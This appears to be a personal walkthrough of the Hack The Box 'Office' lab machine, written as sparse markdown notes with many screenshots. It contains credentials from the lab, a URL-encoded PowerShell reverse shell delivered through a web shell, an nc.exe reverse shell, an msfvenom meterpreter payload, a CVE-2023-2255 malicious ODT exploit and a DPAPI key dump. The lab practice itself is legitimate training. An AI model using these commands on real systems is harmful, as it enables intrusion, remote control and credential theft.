# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings
### Credentials
` dwolfe : H0lOgrams4reTakIng0Ver754! `
` tstark : playboy69 `
` hhogan : H4ppyFtW183#`
## External
### Enumeration
![](https://i.imgur.com/LLqBJHY.png)

![](https://i.imgur.com/e1T2yKc.jpeg)
![](https://i.imgur.com/Z1CDle4.png)
![](https://i.imgur.com/hbYZGoA.png)
![](https://i.imgur.com/RB8gV7S.png)
```shell
 ID   Super User  Name        Username    Email       Send Email  Register D  Last Visit  Group Name
                                                                  ate          Date       s
 --   ----------  ----        --------    -----       ----------  ----------  ----------  ----------
 474  *           Tony Stark  Administra  Administra  1           2023-04-13  2024-01-24  Super User
                              tor         tor@hologr               23:27:32    13:00:47   s
                                          aphy.htb
Administrator
[+] Config JSON saved to /home/rexder/.msf4/loot/20240612033753_default_10.10.11.3_joomla.config_506182.bin
[+] Joomla Config
=============

 Setting        Value
 -------        -----
 db encryption  0
 db host        localhost
 db name        joomla_db
 db password    H0lOgrams4reTakIng0Ver754!
 db prefix      if2tx_
 db user        root
 dbtype         mysqli

[+] VALID USERNAME:	 ewhite@office.htb
```
http://office.htb/index.php?view=article&id=2
![](https://i.imgur.com/0tL9wOU.png)
- and i did password spraying and on the user `dwolfe` we can use the `db` password we got/
![](https://i.imgur.com/SzmR7dn.png)
- inside the Soc Analysis Share i got a pcap file of some smb network
![](https://i.imgur.com/vixzsHN.png)
![](https://i.imgur.com/Pe38tqw.png)
![](https://i.imgur.com/8YOQ0Bv.png)
![](https://i.imgur.com/Q2WhCNx.png)
![](https://i.imgur.com/bSkSfeP.png)
```shell
http://office.htb/templates/cassiopeia/error.php?cmd=powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.14.4%27%2C3001%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```
### Gaining Access
![](https://i.imgur.com/ixdje0d.png)
## Internal
### Enumeration
- Because of the already Account of tstark, i logged in to it using `runas` sctipts
![](https://i.imgur.com/s30zWHy.png)
```shll
Invoke-RunasCs -Username tstark -Password 'playboy69' -Command 'c:\users\public\nc.exe 10.10.14.4 4344 -e powershell.exe'

**foreach ($name in $service_names){$sddl = sc.exe sdshow $service_names -match "RP[A-Z]*?;;;AU"{$service_names }}

client 10.10.14.4:8008 R:8083:127.0.0.1:8083 R:9389:127.0.0.1:9389
```
![](https://i.imgur.com/dWuClEZ.png)
- tried to forward the `3306`,`8083` and `9389`
![](https://i.imgur.com/mC8ggZ5.png)
```shell
rexder@HunterMachine ~/C/H/M/o/CVE-2023-2255 (main) [SIGINT]> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=9090 -f exe -o exploit.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: exploit.exe

rexder@HunterMachine ~/C/H/M/o/CVE-2023-2255 (main)> python3 CVE-2023-2255.py --cmd 'C:\users\public\exploit.exe' --output 'exploit.odt'
File exploit.odt has been created !
```
Libre office is installed with vulnerable `odt` when i access the webserver it asks for odt file
![](https://i.imgur.com/qPK72st.png) 
### Gaining Access

- There for I uploaded the odt i generated.![](https://i.imgur.com/oruWxl9.png)
![](https://i.imgur.com/SgaEZEm.png)
![](https://i.imgur.com/k95I0tv.png)
### Maintaining Access
- DPAPI Cred
	- ![](https://i.imgur.com/qkCrdQ6.png)
```shell
[domainkey] with RPC
[DC] 'office.htb' will be the domain
[DC] 'DC.office.htb' will be the DC server
  key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
  sha1: 85285eb368befb1670633b05ce58ca4d75c73c77
```
- Check How you crack on [[924. 🌬Windows Privilege Escalation]]
- ![](https://i.imgur.com/PMhNIhS.jpeg)
![](https://i.imgur.com/elxt0Qa.png)
![](https://i.imgur.com/5BPMTqK.png)
![](https://i.imgur.com/Tt3zaAX.jpeg)
![](https://i.imgur.com/S9WIbS3.png)
![](https://i.imgur.com/egmdKEb.png)

# Random Notes